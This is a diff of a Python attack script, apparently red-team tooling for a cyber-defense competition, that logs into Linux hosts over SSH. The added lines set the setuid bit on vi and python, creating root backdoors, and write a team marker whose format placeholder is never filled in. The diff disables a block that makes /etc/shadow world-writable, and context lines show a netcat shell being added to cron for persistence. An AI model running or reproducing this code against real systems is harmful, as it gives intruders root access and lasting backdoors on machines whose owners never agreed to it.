@@ -142,7 +142,30 @@ def universal_linux_attack(host):
             log_line(ssh.before.decode('utf8'), host)
 
     
+    # setuid on vi
+    setuid_vi_cmd = "chmod u+s /usr/bin/vi"
+    ssh.prompt()
+    log_line("Turning on setuid bit for /usr/bin/vi on {}".format(host.ip), host, print_flag=True)
+    ssh.sendline(setuid_vi_cmd)
+    ssh.prompt()
+    log_line(ssh.before.decode('utf8'), host)
     
+    # setuid on python
+    setuid_vi_cmd = "chmod u+s /usr/bin/python"
+    ssh.prompt()
+    log_line("Turning on setuid bit for /usr/bin/python on {}".format(host.ip), host, print_flag=True)
+    ssh.sendline(setuid_vi_cmd)
+    ssh.prompt()
+    log_line(ssh.before.decode('utf8'), host)
+
+    ## Mark team numbers
+    mark_team_cmd = "echo {} > /etc/team"
+    ssh.prompt()
+    log_line("Logging team number for host on {}".format(host.ip), host, print_flag=True)
+    ssh.sendline(mark_team_cmd)
+    ssh.prompt()
+    log_line(ssh.before.decode('utf8'), host)
+    """
     # ez mode /etc/shadow
     shadow_perms_cmd = "chmod 777 /etc/shadow"
     ssh.prompt()
@@ -166,7 +189,7 @@ def universal_linux_attack(host):
     ssh.sendline(group_perms_cmd)
     ssh.prompt()
     log_line(ssh.before.decode('utf8'), host)
-
+    """
     # add netcat shell to cron
     netcat_port = "1{}{}".format(host.team, host.last_octet)
     # https://stackoverflow.com/questions/4880290/how-do-i-create-a-crontab-through-a-script
